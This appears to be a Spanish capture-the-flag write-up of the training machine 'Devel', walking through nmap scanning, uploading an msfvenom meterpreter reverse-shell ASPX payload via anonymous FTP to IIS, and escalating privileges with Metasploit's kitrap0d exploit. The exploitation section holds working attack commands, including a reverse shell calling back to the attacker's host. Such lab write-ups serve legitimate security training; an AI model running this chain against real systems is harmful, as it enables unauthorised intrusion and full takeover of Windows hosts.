---
description: '✍️ Autor: ch4p 🔍 Dificultad: Fácil 📅 Fecha de creación: 3/10/2017'
---

# Devel

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.10.5
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-15 154035.png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.10.5
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **Puerto 21 (FTP):** FTP es un protocolo de transferencia de archivos, y su mayor riesgo es la posibilidad de acceso anónimo o el uso de credenciales débiles. Asegúrate de verificar si el acceso anónimo está habilitado, ya que esto permitiría a cualquier persona conectarse sin credenciales. También es importante comprobar si el servidor está configurado para permitir la conexión sobre FTP sin cifrado, ya que los datos y las credenciales se transmiten en texto claro, lo que facilita la interceptación.
* **Puerto 80 (HTTP):** Este puerto generalmente está asociado a servidores web. Si el servicio está ejecutando un servidor web como Apache, Nginx o IIS, es recomendable buscar vulnerabilidades conocidas relacionadas con el software y versiones en uso (por ejemplo, a través de CVEs). Además, es importante realizar pruebas de seguridad en las aplicaciones web que se ejecutan en el servidor, como inyecciones SQL, Cross-Site Scripting (XSS) o vulnerabilidades de escalada de privilegios.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p21,80 -v 10.10.10.5
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Es un **Microsoft IIS**. Como tenemos el puerto 21 con el usuario Anonymous podemos subir un archivo **.aspx** y hacer una Reverse Shell.

### 🚀 **EXPLOTACIÓN**

Creamos el archivo malicioso.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f aspx -o shell.aspx
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Lo subimos a través de FTP.

```bash
ftp 10.10.10.5
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ejecutamos mediante la URL y conseguimos la conexión con **meterpreter**.

```
shell
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se accede al directorio `C:\Windows\TEMP` para operar en un área temporal segura.

```bash
meterpreter > cd %TEMP%
meterpreter > pwd
```

Se mantiene la sesión abierta mientras se ejecutan otros módulos en Metasploit.

```bash
meterpreter > background
```

Buscar el módulo de recomendación de exploits locales y ejecutarlo.

```
msf6 exploit(multi/handler) > search suggester
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > show options
msf6 post(multi/recon/local_exploit_suggester) > sessions -l
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención el exploit `exploit/windows/local/ms10_015_kitrap0d.`

```bash
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.7
msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions -l
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 2
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
